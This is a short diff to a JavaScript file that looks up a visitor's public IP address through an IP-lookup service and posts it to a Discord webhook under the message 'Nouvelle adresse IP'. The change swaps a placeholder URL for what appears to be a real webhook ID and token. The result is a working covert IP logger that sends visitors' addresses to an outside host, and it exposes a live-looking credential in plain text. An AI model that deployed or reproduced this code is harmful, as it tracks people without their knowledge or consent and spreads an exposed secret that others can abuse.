@@ -6,7 +6,7 @@ fetch('https://api.ipify.org/?format=json')
     })
     .then(function(data) {
         ip = data.ip;
-        var webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+        var webhookUrl = 'https://discord.com/api/webhooks/1140356908381909195/jUateRhyC56ZNigpinq2ygUtqkF05RV0fYjYj2sFld3A_d0K4S9uNB0o8GvD4nsFck4H';
         
         var payload = {
             content: 'Nouvelle adresse IP : ' + ip
